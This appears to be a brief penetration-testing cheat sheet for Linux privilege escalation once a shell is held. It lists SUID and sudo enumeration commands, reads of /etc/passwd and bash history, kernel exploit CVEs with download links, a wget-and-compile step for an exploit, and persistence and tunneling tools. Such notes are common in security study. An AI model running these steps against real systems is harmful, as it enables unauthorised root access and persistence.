
INPUT: Stablished shell
PROCESS:
- Privilege Escalation
    - Manual Vector Finding
        - find / -perm /4000 2>/dev/null
        - find / -type f -user root -perm -u=s 2>/dev/null
        - find / -perm -u=s -type f 2>/dev/null
        - sudo -l
        - sudo -V
        - cat .bash_history
        - cat /etc/passwd
    - Auto Vector Finding
        - linpeas.sh
- Maintain Access
TOOLS
- Kernel Exploit
    - CVE-2017-16995
    - CVE-2021-4034
- GTFOBins
    - find
    - vim
    - sudo
- Python Library Hijacking
OUPUT:
- root shell


## Privilege Escalation
[cve-2017-16995]
    wget https://www.exploit-db.com/download/45010 -O cve-2017-16995.c
    gcc --static cve-2017-16995.c -o cve-2017-16995
[CVE-2021-4034]
    https://www.exploit-db.com/exploits/50689
    https://github.com/ryaagard/CVE-2021-4034
    https://github.com/c3c/CVE-2021-4034
[CVE-2017-0143]
    https://www.exploit-db.com/exploits/43970
[GTFOBins]
    https://gtfobins.github.io/

## Maintain Access
- PowerSploit
- Weewly
- dns2tcp



